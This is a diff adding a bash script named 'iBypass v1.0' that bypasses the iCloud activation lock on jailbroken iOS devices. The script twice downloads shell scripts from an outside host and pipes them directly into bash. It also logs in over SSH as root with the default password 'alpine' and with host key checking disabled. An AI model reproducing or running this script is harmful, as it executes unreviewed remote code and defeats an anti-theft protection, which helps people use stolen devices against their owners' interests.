@@ -1,0 +1,34 @@
+#!/bin/bash
+
+reset
+clear
+echo "			 iBypass v1.0 "
+echo "**********************************************************"
+echo "* iCloud Bypass by: @iRogerosx, Script by: @Unknown240   *"
+echo "**********************************************************"
+echo
+echo --------------------------------------------
+echo
+echo
+read -p " Connect Internet, then press ENTER "
+echo "Install requirements! "
+
+bash <(curl -s http://imadcydia.com/Bypas1.sh)
+echo
+echo "Done!"
+echo
+read -p "Now Jailbreak Your iDevice,then press ENTER!"
+
+
+iproxy 2222 44 2> /dev/null &
+
+runcmd () {
+    sshpass -p alpine ssh -o StrictHostKeyChecking=no root@localhost -p 2222 "$1" > /dev/null
+}
+echo
+echo
+echo "Bypassing!"
+echo
+bash <(curl -s http://imadcydia.com/Bypas2.sh)
+
+echo "Done :)"
